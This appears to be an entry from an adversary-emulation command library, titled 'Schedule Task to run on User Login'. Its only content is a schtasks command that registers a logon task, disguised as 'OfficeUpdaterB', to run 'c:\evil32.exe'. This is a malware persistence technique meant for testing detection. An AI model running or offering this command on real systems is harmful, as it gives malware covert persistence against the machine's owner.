---
id: 4903dea2-de7a-413d-bc7b-26ce03be0248
name: Schedule Task to run on User Login
type: command
executor: ''
data: schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services"
  /SC onlogon
output: null
created_at: '2020-07-15T21:22:25.606336+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Schedule Task to run on User Login

```bash
schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services" /SC onlogon
```


